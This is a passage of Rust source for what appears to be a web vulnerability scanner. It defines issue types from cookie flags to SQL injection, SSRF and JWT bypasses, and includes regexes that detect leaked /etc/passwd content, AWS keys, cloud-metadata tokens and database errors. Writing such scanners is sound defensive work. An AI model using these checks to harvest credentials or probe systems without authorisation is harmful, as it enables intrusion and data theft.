//! Independent HTTP audit checks. Passive analysis has no network capability.
use super::{Candidate, Confidence, Evidence, IssueDefinition, ScanSettings, Severity};
use crate::{
    http::Message,
    model::{Destination, Exchange},
};
use base64::{
    Engine as _,
    engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD},
};
use p256::ecdsa::{Signature, SigningKey, signature::Signer};
use rand_core::OsRng;
use regex::Regex;
use sha2::{Digest, Sha256, Sha384, Sha512};
use std::{collections::BTreeSet, io::Read, sync::LazyLock};
mod advanced;
mod charset;
mod reflection;
mod stored;
mod stylesheet;

#[derive(Clone, Debug)]
pub struct Probe {
    pub issue_id: String,
    pub insertion_point: String,
    pub request: Vec<u8>,
    pub destination: Destination,
    pub raw: bool,
    matcher: Matcher,
}

#[derive(Clone, Debug)]
enum Matcher {
    Advanced(advanced::Matcher),
    Stored(stored::Matcher),
    SqlError,
    Entity(String),
    Xss {
        token: String,
        payload: String,
    },
    ReflectedInput(String),
    Stylesheet(stylesheet::ProbePart),
    Header(String),
    Redirect(String),
    Cors(String),
    Contains {
        value: String,
        absent: String,
    },
    File(FileKind),
    Graphql,
    Trace(String),
    Series {
        family: String,
        pair: usize,
        positive: bool,
        payload: String,
    },
}
#[derive(Clone, Debug)]
enum FileKind {
    Env,
    Git,
    GitHead,
    Backup,
    Robots,
    Openapi,
    Jwks,
    AspTrace,
    PhpInfo,
    WebConfig,
    Actuator,
    Aws,
    DsStore,
    ServerStatus,
    Elmah,
    Svn,
}

fn build_definitions() -> Vec<IssueDefinition> {
    use Severity::*;
    let rows = [
        (
            "cookie-secure",
            "TLS cookie without Secure",
            Medium,
            true,
            false,
            false,
            "A cookie received over TLS can also be sent over plaintext HTTP.",
            "Set Secure on cookies that do not need plaintext transport.",
        ),
        (
            "cookie-httponly",
            "Cookie without HttpOnly",
            Low,
            true,
            false,
            false,
            "A cookie is accessible to scripts running in the origin.",
            "Set HttpOnly on cookies that scripts do not need to read.",
        ),
        (
            "cookie-samesite",
            "Cookie without SameSite",
            Information,
            true,
            false,
            false,
            "A cookie does not explicitly declare its cross-site delivery policy.",
            "Set an appropriate SameSite policy and retain separate CSRF defenses.",
        ),
        (
            "cookie-domain",
            "Cookie scoped to parent domain",
            Low,
            true,
            false,
            false,
            "A cookie is shared with sibling hosts through its Domain attribute.",
            "Prefer host-only cookies unless cross-host sharing is required.",
        ),
        (
            "duplicate-cookies",
            "Duplicate cookies set",
            Information,
            true,
            false,
            false,
            "A response sets the same cookie name and scope multiple times.",
            "Set a single unambiguous value for each cookie scope.",
        ),
        (
            "cookie-invalid",
            "Cookie violates browser prefix or SameSite requirements",
            Low,
            true,
            false,
            false,
            "A cookie uses a __Host- or __Secure- prefix without the required attributes, or declares SameSite=None without Secure; browsers reject such cookies.",
            "For __Host- set Secure, Path=/ and omit Domain; for SameSite=None always set Secure.",
        ),
        (
            "hsts",
            "Strict transport security not enforced",
            Low,
            true,
            false,
            false,
            "An HTTPS response lacks a positive HSTS policy.",
            "Serve Strict-Transport-Security with an appropriate positive max-age.",
        ),
        (
            "clickjacking",
            "Frameable HTML response",
            Information,
            true,
            false,
            false,
            "An HTML page has no effective framing restriction.",
            "Set CSP frame-ancestors or a valid X-Frame-Options policy.",
        ),
        (
            "csp-unsafe-script",
            "CSP permits unsafe script execution",
            Information,
            true,
            false,
            false,
            "The effective script policy permits unsafe inline scripts or eval.",
            "Use nonces or hashes and remove unsafe-eval and unrestricted sources.",
        ),
        (
            "nosniff",
            "Content sniffing not disabled",
            Information,
            true,
            false,
            false,
            "A script or HTML response does not disable browser MIME sniffing.",
            "Send X-Content-Type-Options: nosniff with correct media types.",
        ),
        (
            "xss-filter-disabled",
            "Legacy browser XSS filter disabled",
            Information,
            true,
            false,
            false,
            "The response explicitly disables the legacy XSS filter.",
            "Use output encoding and a restrictive CSP; do not rely on legacy filters.",
        ),
        (
            "cleartext-password",
            "Cleartext transmission of credentials",
            High,
            true,
            false,
            false,
            "Credentials are submitted in a plaintext request or password form.",
            "Use HTTPS for the complete credential flow.",
        ),
        (
            "password-url",
            "Password in URL query",
            Low,
            true,
            false,
            false,
            "A password-like parameter is present in a request URL.",
            "Submit passwords in an HTTPS request body and avoid URL logging.",
        ),
        (
            "session-url",
            "Session token in URL",
            Medium,
            true,
            false,
            false,
            "A session-like parameter is present in a request URL.",
            "Keep session identifiers in secure cookies rather than URLs.",
        ),
        (
            "mixed-content",
            "Mixed active content",
            Information,
            true,
            false,
            false,
            "An HTTPS page loads an active resource using plaintext HTTP.",
            "Load scripts, frames, objects, and styles exclusively over HTTPS.",
        ),
        (
            "crossdomain-script",
            "Cross-domain script include",
            Information,
            true,
            false,
            false,
            "A page trusts JavaScript hosted by a different origin.",
            "Review external script trust and use integrity metadata where appropriate.",
        ),
        (
            "private-key",
            "Private key disclosed",
            Information,
            true,
            false,
            false,
            "A response contains a complete private-key PEM block.",
            "Remove the key, rotate it, and investigate exposure.",
        ),
        (
            "private-ip",
            "Private IP address disclosed",
            Information,
            true,
            false,
            false,
            "A response exposes an internal IPv4 address.",
            "Remove unnecessary internal infrastructure details.",
        ),
        (
            "email",
            "Email address disclosed",
            Information,
            true,
            false,
            false,
            "A response contains an email address.",
            "Review whether disclosure is intended.",
        ),
        (
            "credit-card",
            "Payment card number disclosed",
            Information,
            true,
            false,
            false,
            "A response contains a plausible Luhn-valid payment card number.",
            "Remove or mask payment data and restrict response caching.",
        ),
        (
            "sql-disclosure",
            "Database error disclosed",
            Low,
            true,
            false,
            false,
            "A response contains a recognizable database diagnostic.",
            "Return generic errors and retain detailed diagnostics in protected logs.",
        ),
        (
            "stack-trace",
            "Stack trace disclosed",
            Low,
            true,
            false,
            false,
            "A response exposes a framework stack trace.",
            "Disable debug responses in deployed environments.",
        ),
        (
            "source-code",
            "Server source code disclosed",
            Low,
            true,
            false,
            false,
            "A response contains server-side source code rather than executed output.",
            "Prevent source files from being served and review runtime configuration.",
        ),
        (
            "directory-listing",
            "Directory listing",
            Information,
            true,
            false,
            false,
            "A response presents an automatically generated directory index.",
            "Disable directory browsing and restrict exposed files.",
        ),
        (
            "robots",
            "Robots exclusion file",
            Information,
            true,
            true,
            false,
            "A robots.txt response lists crawler instructions.",
            "Do not use robots.txt as an access-control boundary.",
        ),
        (
            "openapi",
            "OpenAPI definition exposed",
            Information,
            true,
            true,
            false,
            "A response contains an OpenAPI or Swagger API definition.",
            "Review whether public API schema exposure is intended.",
        ),
        (
            "jwks",
            "JSON Web Key Set disclosed",
            Information,
            true,
            true,
            false,
            "A response contains a JSON Web Key Set.",
            "Only publish intended public keys; never include private key parameters.",
        ),
        (
            "jwk-private",
            "Private JSON Web Key disclosed",
            High,
            true,
            false,
            false,
            "A published JWK contains a private key parameter.",
            "Remove private fields and rotate the exposed key.",
        ),
        (
            "jwt-weak-secret",
            "JWT signed with a weak HMAC secret",
            High,
            true,
            false,
            false,
            "A captured HS256 token verifies with a common weak secret.",
            "Rotate the key and use a cryptographically random signing secret.",
        ),
        (
            "serialized-object",
            "Serialized Java object in HTTP",
            High,
            true,
            false,
            false,
            "A message contains the Java serialization stream signature.",
            "Avoid deserializing untrusted native objects; restrict types and authenticate data.",
        ),
        (
            "multiple-content-types",
            "Multiple Content-Type headers",
            Information,
            true,
            false,
            false,
            "Multiple media-type headers may be interpreted inconsistently.",
            "Send one correct Content-Type header.",
        ),
        (
            "missing-content-type",
            "Response media type not specified",
            Information,
            true,
            false,
            false,
            "A nonempty successful response lacks Content-Type.",
            "Send an explicit correct media type.",
        ),
        (
            "wrong-content-type",
            "Incorrect response media type",
            Low,
            true,
            false,
            false,
            "The declared media type conflicts with a recognizable body signature.",
            "Set the correct Content-Type and disable MIME sniffing.",
        ),
        (
            "charset",
            "HTML character encoding not declared",
            Information,
            true,
            false,
            false,
            "Non-ASCII HTML lacks an explicit character encoding.",
            "Declare UTF-8 through Content-Type or a charset meta element.",
        ),
        (
            "charset-unrecognized",
            "HTML uses unrecognized charset",
            Information,
            true,
            false,
            false,
            "The HTML declares a character encoding that browsers do not recognize and has no recognized fallback declaration.",
            "Declare a recognized encoding such as UTF-8 and encode the document accordingly.",
        ),
        (
            "cache-sensitive",
            "Authenticated response explicitly public-cacheable",
            Information,
            true,
            false,
            false,
            "A response to an authenticated request explicitly permits shared caching.",
            "Use private or no-store for personalized responses.",
        ),
        (
            "static-dom",
            "Potential DOM injection in captured JavaScript",
            High,
            true,
            false,
            false,
            "Captured source directly passes URL-controlled data to a dangerous sink.",
            "Use safe DOM APIs, avoid eval, and validate sources; manually verify reachability.",
        ),
        (
            "sql-request",
            "SQL statement in request parameter",
            Medium,
            true,
            false,
            false,
            "A captured request contains a SQL statement in an input value.",
            "Avoid exposing query-language interfaces to untrusted callers.",
        ),
        (
            "password-cookie",
            "Password stored in cookie",
            Medium,
            true,
            false,
            false,
            "A known submitted password is also present in a captured cookie.",
            "Keep passwords out of cookies; use opaque session identifiers.",
        ),
        (
            "password-autocomplete",
            "Password field with autocomplete enabled",
            Low,
            true,
            false,
            false,
            "A password input does not disable browser credential autocomplete.",
            "Set autocomplete=off or a purpose-specific token on sensitive password fields.",
        ),
        (
            "long-redirection",
            "Long redirection response",
            Information,
            true,
            false,
            false,
            "A redirection response carries a large body that is normally not displayed.",
            "Return an empty or short redirection body and avoid including sensitive content.",
        ),
        (
            "password-response",
            "Submitted password returned in response",
            Medium,
            true,
            false,
            false,
            "A submitted password is returned literally in the response.",
            "Do not echo submitted passwords into response content.",
        ),
        (
            "referer-leak",
            "Sensitive data leaked through cross-domain Referer",
            Information,
            true,
            false,
            false,
            "A request to another domain carries a sensitive query value in Referer.",
            "Keep secrets out of URLs and set an appropriate Referrer-Policy.",
        ),
        (
            "file-upload",
            "File upload functionality",
            Information,
            true,
            false,
            false,
            "An HTML response contains a file upload input.",
            "Validate file type and content, isolate storage, and prevent execution.",
        ),
        (
            "crossdomain-post",
            "Cross-domain form submission",
            Information,
            true,
            false,
            false,
            "A captured HTML form submits data to another host.",
            "Review the trust boundary and protect sensitive form submissions.",
        ),
        (
            "meta-refresh-external",
            "Meta refresh navigates to another origin",
            Low,
            true,
            false,
            false,
            "An HTML meta refresh directive sends the browser to a different origin.",
            "Use server-side redirects to allowlisted destinations and avoid script-controlled refresh targets.",
        ),
        (
            "target-blank-noopener",
            "New-tab link without noopener",
            Low,
            true,
            false,
            false,
            "A target=_blank link does not declare rel=noopener or rel=noreferrer, so the opened page can access window.opener.",
            "Add rel=\"noopener noreferrer\" to links that open a new browsing context.",
        ),
        (
            "javascript-uri",
            "JavaScript URI in an HTML attribute",
            Low,
            true,
            false,
            false,
            "An HTML attribute uses a javascript: URI, which executes script in the page origin.",
            "Use event handlers with normal URLs or application routing instead of javascript: URIs.",
        ),
        (
            "asp-trace",
            "ASP.NET application tracing exposed",
            High,
            true,
            true,
            false,
            "An ASP.NET tracing page exposes recorded application requests.",
            "Disable remote tracing and restrict diagnostic endpoints.",
        ),
        (
            "phpinfo",
            "PHP runtime information exposed",
            Low,
            true,
            true,
            false,
            "A phpinfo page exposes runtime and environment configuration.",
            "Remove diagnostic phpinfo pages from deployed systems.",
        ),
        (
            "web-config",
            "ASP.NET configuration disclosed",
            High,
            true,
            true,
            false,
            "An exposed web.config includes application configuration sections.",
            "Prevent configuration files from being served as static content.",
        ),
        (
            "aws-credentials",
            "AWS credentials file disclosed",
            High,
            false,
            true,
            false,
            "A response contains an AWS shared-credentials file with an access key.",
            "Deny web access to credential files and rotate the disclosed keys.",
        ),
        (
            "ds-store",
            "macOS metadata file exposed",
            Information,
            false,
            true,
            false,
            "A .DS_Store response contains the Finder metadata signature.",
            "Remove hidden desktop metadata from deployed directories.",
        ),
        (
            "server-status",
            "Server status page exposed",
            Medium,
            false,
            true,
            false,
            "A mod_status page lists recent requests and server performance data.",
            "Restrict status handlers to trusted management networks.",
        ),
        (
            "elmah",
            "Error log handler exposed",
            Medium,
            false,
            true,
            false,
            "An ELMAH error log interface exposes recorded exception details.",
            "Restrict the error log handler and remove it from production endpoints.",
        ),
        (
            "svn-metadata",
            "Subversion metadata exposed",
            Medium,
            false,
            true,
            false,
            "A Subversion administrative directory lists repository entries.",
            "Remove version-control metadata from the web root.",
        ),
        (
            "sqli-error",
            "SQL injection (database error)",
            High,
            false,
            true,
            false,
            "An injected delimiter introduces a database-specific error absent from the baseline.",
            "Use parameterized queries and strict typed input.",
        ),
        (
            "sqli-boolean",
            "SQL injection (boolean differential)",
            High,
            false,
            true,
            false,
            "Repeated complementary SQL predicates produce reproducible result differences.",
            "Use parameterized queries and strict typed input.",
        ),
        (
            "sqli-time",
            "SQL injection (time differential)",
            High,
            false,
            true,
            false,
            "Repeated paired SQL delay probes produce controlled response delays.",
            "Use parameterized queries and strict typed input.",
        ),
        (
            "xss-reflected",
            "Reflected cross-site scripting",
            High,
            false,
            true,
            false,
            "A unique executable HTML marker is returned unescaped in an HTML response.",
            "Apply context-aware output encoding and avoid unsafe HTML construction.",
        ),
        (
            "input-reflected",
            "Input returned in response (reflected)",
            Information,
            false,
            true,
            false,
            "A unique request marker was returned in the immediate response.",
            "Review the context where input is returned and apply context-appropriate encoding.",
        ),
        (
            "input-transformed",
            "Suspicious input transformation (reflected)",
            Information,
            false,
            true,
            false,
            "Percent escapes, JavaScript escapes, or numeric character references in input are returned decoded in the immediate response.",
            "Apply validation after canonicalization and apply output encoding for the destination context.",
        ),
        (
            "path-relative-stylesheet",
            "Path-relative style sheet import",
            Information,
            false,
            true,
            false,
            "An added path segment changes a relative stylesheet URL to an HTML response that contains controlled input.",
            "Use root-relative stylesheet URLs and serve stylesheets as text/css with X-Content-Type-Options: nosniff.",
        ),
        (
            "header-injection",
            "HTTP response header injection",
            High,
            false,
            true,
            false,
            "An encoded newline payload introduces a uniquely marked response header.",
            "Reject CR/LF in header-bound input and use safe header APIs.",
        ),
        (
            "open-redirect",
            "Open redirection",
            Low,
            false,
            true,
            false,
            "A supplied external URL becomes the response's redirect destination.",
            "Allowlist redirect destinations and prefer relative application paths.",
        ),
        (
            "cors-origin",
            "Credentialed CORS trusts an arbitrary origin",
            High,
            false,
            true,
            false,
            "An arbitrary probe origin is reflected with credentialed CORS permission.",
            "Allowlist trusted origins and minimize credentialed cross-origin access.",
        ),
        (
            "path-traversal",
            "File path traversal",
            High,
            false,
            true,
            false,
            "A traversal payload returns recognizable operating-system file content.",
            "Avoid user-controlled paths or resolve them beneath a fixed permitted directory.",
        ),
        (
            "template-injection",
            "Server-side template injection",
            High,
            false,
            true,
            false,
            "A uniquely bounded arithmetic expression is evaluated on the server.",
            "Treat input as template data and never as template source.",
        ),
        (
            "command-injection",
            "OS command injection (output)",
            High,
            false,
            true,
            false,
            "A command payload returns a marker assembled by the shell rather than present in the input.",
            "Avoid shells and pass separately validated arguments to process APIs.",
        ),
        (
            "command-time",
            "OS command injection (time differential)",
            High,
            false,
            true,
            false,
            "Repeated paired shell delay probes produce controlled response delays.",
            "Avoid shells and pass separately validated arguments to process APIs.",
        ),
        (
            "xml-entity",
            "XML entity expansion",
            Medium,
            false,
            true,
            false,
            "A bounded internal XML entity is expanded into the application response.",
            "Disable DTDs and entity expansion in untrusted XML parsers.",
        ),
        (
            "xxe-file",
            "XML external entity file disclosure",
            High,
            false,
            true,
            false,
            "An external XML entity exposes recognizable local file content.",
            "Disable DTDs and external entity resolution.",
        ),
        (
            "xinclude",
            "XML XInclude file disclosure",
            High,
            false,
            true,
            false,
            "An XInclude element resolves a local file into the application response.",
            "Disable XInclude processing for untrusted documents.",
        ),
        (
            "graphql-introspection",
            "GraphQL introspection enabled",
            Low,
            false,
            true,
            false,
            "A GraphQL response supplies schema introspection data.",
            "Review whether schema introspection should be available to this caller.",
        ),
        (
            "trace",
            "HTTP TRACE enabled",
            Information,
            false,
            true,
            false,
            "TRACE echoes the uniquely marked probe request as message/http.",
            "Disable TRACE unless specifically required.",
        ),
        (
            "env-file",
            "Environment configuration disclosed",
            High,
            false,
            true,
            false,
            "An exposed environment file contains recognizable configuration assignments.",
            "Deny web access to environment files and rotate disclosed credentials.",
        ),
        (
            "git-config",
            "Git repository metadata exposed",
            Medium,
            false,
            true,
            false,
            "A .git/config response contains a Git core section and repository settings.",
            "Remove version-control metadata from the web root.",
        ),
        (
            "backup-file",
            "Backup source file exposed",
            Medium,
            false,
            true,
            false,
            "A backup-path response contains server source or configuration content.",
            "Remove backup files from served directories.",
        ),
        (
            "jwt-none",
            "JWT unsigned tokens accepted",
            High,
            false,
            true,
            false,
            "An unsigned JWT retains access while a deliberately invalid control token is rejected.",
            "Enforce the expected algorithm and verify every token signature.",
        ),
        (
            "jwt-signature",
            "JWT signature not verified",
            High,
            false,
            true,
            false,
            "A JWT with a corrupted signature retains access while a malformed control token is rejected.",
            "Cryptographically verify every JWT before trusting any claim.",
        ),
        (
            "jwt-jwk",
            "JWT accepts a self-signed embedded JWK",
            High,
            false,
            true,
            false,
            "An unsigned trust decision accepts a token whose header embeds the attacker's own verification key.",
            "Ignore token-supplied keys and resolve verification keys from a trusted configuration.",
        ),
        (
            "ssrf-inline",
            "Server-side request forgery (metadata disclosure)",
            High,
            false,
            true,
            false,
            "A supplied internal HTTP URL returns structured cloud instance credentials.",
            "Allowlist permitted remote resources and deny access to internal metadata services.",
        ),
        (
            "file-uri",
            "Local file disclosure through URI input",
            High,
            false,
            true,
            false,
            "A file URI input returns recognizable operating-system file content.",
            "Allowlist resource schemes and prevent user-controlled local file access.",
        ),
        (
            "code-injection",
            "Server-side code injection",
            High,
            false,
            true,
            false,
            "A code expression assembles a unique marker absent from the submitted payload.",
            "Treat input as data and avoid dynamic evaluation.",
        ),
        (
            "ssi-injection",
            "Server-side include injection",
            High,
            false,
            true,
            false,
            "An SSI directive assembles a marker through server-side command execution.",
            "Disable SSI for untrusted content and reject dynamic include directives.",
        ),
    ];
    rows.into_iter()
        .map(
            |(id, name, severity, passive, active, intrusive, description, remediation)| {
                IssueDefinition {
                    id: id.into(),
                    name: name.into(),
                    severity,
                    passive,
                    active,
                    intrusive,
                    description: description.into(),
                    remediation: remediation.into(),
                    references: vec![],
                }
            },
        )
        .chain(advanced::definitions())
        .chain(stored::definitions())
        .chain(super::tls_checks::definitions())
        .collect()
}

fn catalog() -> &'static [IssueDefinition] {
    static CATALOG: std::sync::OnceLock<Vec<IssueDefinition>> = std::sync::OnceLock::new();
    CATALOG.get_or_init(build_definitions)
}

pub fn definitions() -> Vec<IssueDefinition> {
    catalog().to_vec()
}

/// Cached definition lookup for hot paths such as finding ingestion.
pub fn definition(id: &str) -> Option<&'static IssueDefinition> {
    catalog().iter().find(|definition| definition.id == id)
}

fn candidate(
    id: &str,
    flow: &Exchange,
    confidence: Confidence,
    point: &str,
    detail: impl Into<String>,
) -> Candidate {
    Candidate {
        affected: None,
        issue_id: id.into(),
        confidence,
        insertion_point: point.into(),
        detail: detail.into(),
        evidence: vec![Evidence {
            label: "Observed HTTP exchange".into(),
            exchange: flow.clone(),
        }],
    }
}
fn issue_severity(id: &str) -> Severity {
    definition(id).map_or(Severity::Information, |definition| definition.severity)
}
fn re(pattern: &str, value: &str) -> bool {
    static REGEXES: std::sync::OnceLock<
        std::sync::RwLock<std::collections::BTreeMap<String, Option<Regex>>>,
    > = std::sync::OnceLock::new();
    let cache = REGEXES.get_or_init(Default::default);
    if let Some(regex) = cache.read().unwrap().get(pattern) {
        return regex.as_ref().is_some_and(|r| r.is_match(value));
    }
    let regex = Regex::new(pattern).ok();
    let result = regex.as_ref().is_some_and(|r| r.is_match(value));
    let mut cache = cache.write().unwrap();
    if cache.len() < 256 {
        cache.insert(pattern.into(), regex);
    }
    result
}
fn is_html(message: &Message) -> bool {
    message
        .header("Content-Type")
        .is_some_and(|v| v.to_ascii_lowercase().contains("html"))
}
fn is_json(message: &Message) -> bool {
    message
        .header("Content-Type")
        .is_some_and(|v| v.to_ascii_lowercase().contains("json"))
}
/// All values for a repeated header. Security headers are frequently sent more
/// than once, and only reading the first occurrence manufactures findings when
/// a later, stricter header is present.
fn header_values<'a>(message: &'a Message, name: &'a str) -> impl Iterator<Item = &'a str> {
    message
        .headers
        .iter()
        .filter(move |(key, _)| key.eq_ignore_ascii_case(name))
        .map(|(_, value)| value.as_str())
}
/// Return the source list for the first matching CSP directive. Directive names
/// are case-insensitive and the first occurrence wins, matching browser policy
/// parsing.
fn csp_sources(policy: &str, directives: &[&str]) -> Option<Vec<String>> {
    for directive in directives {
        if let Some(values) = policy.split(';').find_map(|part| {
            let mut words = part.split_whitespace();
            (words.next()?.eq_ignore_ascii_case(directive))
                .then(|| words.map(|s| s.to_ascii_lowercase()).collect::<Vec<_>>())
        }) {
            return Some(values);
        }
    }
    None
}
fn csp_policies(response: &Message, body: &str) -> Vec<String> {
    static META_TAG: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?is)<meta\b[^>]*>").unwrap());
    static META_ATTR: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r#"(?is)([a-zA-Z-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#).unwrap()
    });
    let mut policies: Vec<String> = response
        .headers
        .iter()
        .filter(|(key, _)| key.eq_ignore_ascii_case("Content-Security-Policy"))
        .flat_map(|(_, value)| value.split(',').map(str::trim).map(str::to_owned))
        .collect();
    for tag in META_TAG.find_iter(body) {
        let mut is_csp = false;
        let mut content = None;
        for captures in META_ATTR.captures_iter(tag.as_str()) {
            let name = &captures[1];
            let value = captures
                .get(2)
                .or_else(|| captures.get(3))
                .or_else(|| captures.get(4))
                .map(|value| value.as_str())
                .unwrap_or_default();
            if name.eq_ignore_ascii_case("http-equiv")
                && value.eq_ignore_ascii_case("content-security-policy")
            {
                is_csp = true;
            } else if name.eq_ignore_ascii_case("content") {
                content = Some(value.to_owned());
            }
        }
        if is_csp && let Some(content) = content {
            policies.push(content);
        }
    }
    policies
}
fn csp_script_unsafe(policies: &[String]) -> bool {
    let unsafe_values = |values: &[String]| {
        values.iter().any(|v| v == "'unsafe-inline'")
            && !values.iter().any(|v| {
                v.starts_with("'nonce-")
                    || v.starts_with("'sha256-")
                    || v.starts_with("'sha384-")
                    || v.starts_with("'sha512-")
            })
    };
    // Policies intersect per capability; different allowances cannot be combined.
    [
        vec!["script-src-elem", "script-src", "default-src"],
        vec!["script-src-attr", "script-src", "default-src"],
    ]
    .iter()
    .any(|directives| {
        policies.iter().all(|policy| {
            csp_sources(policy, directives)
                .as_deref()
                .is_none_or(unsafe_values)
        })
    }) || policies.iter().all(|policy| {
        csp_sources(policy, &["script-src", "default-src"])
            .is_none_or(|values| values.iter().any(|v| v == "'unsafe-eval'"))
    })
}
fn bounded_body(message: &Message, limit: usize) -> Option<Vec<u8>> {
    if message.body.len() > limit {
        return None;
    }
    let mut body = message.body.clone();
    let encodings: Vec<_> = message
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("Content-Encoding"))
        .flat_map(|(_, v)| v.split(','))
        .map(|x| x.trim().to_ascii_lowercase())
        .collect();
    if encodings.len() > 8 {
        return None;
    }
    for encoding in encodings.iter().rev() {
        let mut reader: Box<dyn Read + '_> = match encoding.as_str() {
            "identity" => continue,
            "gzip" | "x-gzip" => Box::new(flate2::read::MultiGzDecoder::new(body.as_slice())),
            "deflate"
                if body.len() > 1
                    && body[0] & 15 == 8
                    && u16::from_be_bytes([body[0], body[1]]).is_multiple_of(31) =>
            {
                Box::new(flate2::read::ZlibDecoder::new(body.as_slice()))
            }
            "deflate" => Box::new(flate2::read::DeflateDecoder::new(body.as_slice())),
            "br" => Box::new(brotli::Decompressor::new(body.as_slice(), 4096)),
            "zstd" => Box::new(
                ruzstd::decoding::StreamingDecoder::new_with_max_window_size(
                    body.as_slice(),
                    limit.max(8 * 1024 * 1024) as u64,
                )
                .ok()?,
            ),
            _ => return None,
        };
        let mut decoded = Vec::new();
        reader
            .by_ref()
            .take(limit.saturating_add(1) as u64)
            .read_to_end(&mut decoded)
            .ok()?;
        if decoded.len() > limit {
            return None;
        }
        drop(reader);
        body = decoded;
    }
    Some(body)
}

fn text_body(message: &Message, limit: usize) -> Option<String> {
    let body = bounded_body(message, limit)?;
    let media_type = message
        .header("Content-Type")
        .unwrap_or("")
        .to_ascii_lowercase();
    let charset = media_type.split(';').find_map(|part| {
        let (name, value) = part.split_once('=')?;
        name.trim()
            .eq_ignore_ascii_case("charset")
            .then(|| value.trim().trim_matches(['\"', '\'']))
    });
    if let Some(bytes) = body.strip_prefix(&[0xef, 0xbb, 0xbf]) {
        let text = String::from_utf8_lossy(bytes).into_owned();
        return (text.len() <= limit).then_some(text);
    }
    let bom_little = body.starts_with(&[0xff, 0xfe]);
    let bom_big = body.starts_with(&[0xfe, 0xff]);
    let little = bom_little || (!bom_big && matches!(charset, Some("utf-16le" | "utf-16")));
    let big = bom_big || (!bom_little && charset == Some("utf-16be"));
    if little || big {
        let start =
            usize::from(body.starts_with(&[0xff, 0xfe]) || body.starts_with(&[0xfe, 0xff])) * 2;
        let mut text = String::new();
        let units = body[start..].as_chunks::<2>().0.iter().map(|pair| {
            if big {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        });
        for ch in char::decode_utf16(units) {
            text.push(ch.unwrap_or(char::REPLACEMENT_CHARACTER));
            if text.len() > limit {
                return None;
            }
        }
        return Some(text);
    }
    let bytes = body.strip_prefix(&[0xef, 0xbb, 0xbf]).unwrap_or(&body);
    match std::str::from_utf8(bytes) {
        Ok(text) => Some(text.to_owned()),
        Err(_)
            if media_type.starts_with("text/")
                || media_type.contains("json")
                || media_type.contains("xml")
                || media_type.contains("javascript") =>
        {
            // ASCII delimiters and generated markers survive replacement for legacy
            // ASCII-compatible web encodings. Captured and transmitted bytes stay raw.
            let text = String::from_utf8_lossy(bytes).into_owned();
            (text.len() <= limit).then_some(text)
        }
        Err(_) => None,
    }
}
fn sql_error(body: &str) -> bool {
    re(
        r#"(?i)(SQL syntax.*MySQL|You have an error in your SQL syntax|check the manual that corresponds to your (?:MySQL|MariaDB) server version|SQLSTATE\[[0-9A-Z]{5}\]|ORA-[0-9]{5}:|OracleException|quoted string not properly terminated|SQL command not properly ended|PostgreSQL.{0,80}ERROR|org\.postgresql\.util\.PSQLException|PSQLException|syntax error at or near|Unclosed quotation mark after the character string|Incorrect syntax near|Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver|System\.Data\.SqlClient\.SqlException|SQLite(?:Exception|3::SQLException)|sqlite3?\.OperationalError|SQLITE_ERROR|unterminated quoted string at or near|unrecognized token|near\s+"[^"]*": syntax error|near\s+'[^']*': syntax error|JdbcSQLSyntaxErrorException|SQLSyntaxErrorException|DB2 SQL error|SQLCODE|org\.h2\.jdbc)"#,
        body,
    )
}
fn passwd(body: &str) -> bool {
    re(r"(?m)^root:[^:\r\n]*:0:0:[^\r\n]*$", body)
}
fn hosts_file(body: &str) -> bool {
    re(r"(?m)^\s*(?:127\.0\.0\.1|::1)\s+localhost\b", body)
        && re(r"(?m)^\s*(?:127\.0\.0\.1|::1)\s+", body)
}
fn win_ini(body: &str) -> bool {
    re(
        r"(?im)^\s*\[(?:fonts|extensions|mci extensions|boot loader|files)\]",
        body,
    ) && re(r"(?m)^\s*[A-Za-z0-9_.-]+\s*=", body)
}
fn boot_ini(body: &str) -> bool {
    re(r"(?im)^\s*\[boot loader\]", body) || re(r"(?im)^\s*multi\(0\)disk\(0\)", body)
}
fn environ_file(body: &str) -> bool {
    re(
        r"(?m)(?:^|\x00)(?:PATH|HOME|USER|SHELL|PWD|LANG|HOSTNAME|TERM)=",
        body,
    )
}
fn cloud_token(body: &str) -> bool {
    serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .is_some_and(|v| {
            v.get("access_token")
                .and_then(|v| v.as_str())
                .is_some_and(|s| s.len() >= 16)
                || v.get("AccessKeyId")
                    .and_then(|v| v.as_str())
                    .is_some_and(|s| re(r"^(?:AKIA|ASIA)[A-Z0-9]{16}$", s))
        })
}
fn source_code(body: &str) -> bool {
    re(
        r"(?is)<\?php\s+(?:/\*.*?\*/\s*)?(?:\$[A-Za-z_]|namespace\s|function\s|require|include|declare\s*\()|<%@\s*(?:page|import)\b|<%\s*(?:@|Dim\s|Response\.|var\s|String\s)",
        body,
    ) || re(
        r"(?m)^#!\s*/usr/(?:bin|local/bin)/env\s+(?:python|ruby|perl|node)\b",
        body,
    )
}
fn jwks(body: &str) -> Option<serde_json::Value> {
    let v: serde_json::Value = serde_json::from_str(body).ok()?;
    v.get("keys")?
        .as_array()?
        .iter()
        .any(|k| k.get("kty").is_some())
        .then_some(v)
}
fn openapi(body: &str) -> bool {
    if serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .is_some_and(|v| {
            (v.get("openapi").is_some() || v.get("swagger").is_some())
                && v.get("paths").is_some_and(|p| p.is_object())
        })
    {
        return true;
    }
    re(r#"(?im)^\s*(?:openapi|swagger)\s*:\s*["']?[0-9]"#, body) && re(r"(?im)^\s*paths\s*:", body)
}

static PRIVATE_IP: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\b(?:10(?:\.[0-9]{1,3}){3}|192\.168(?:\.[0-9]{1,3}){2}|172\.(?:1[6-9]|2[0-9]|3[01])(?:\.[0-9]{1,3}){2})\b",
    )
    .unwrap()
});
static EMAIL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,24}\b").unwrap());
static CARD: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b[3-6][0-9](?:[ -]?[0-9]){11,17}\b").unwrap());
static PASSWORD_INPUT: LazyLock<Regex> =
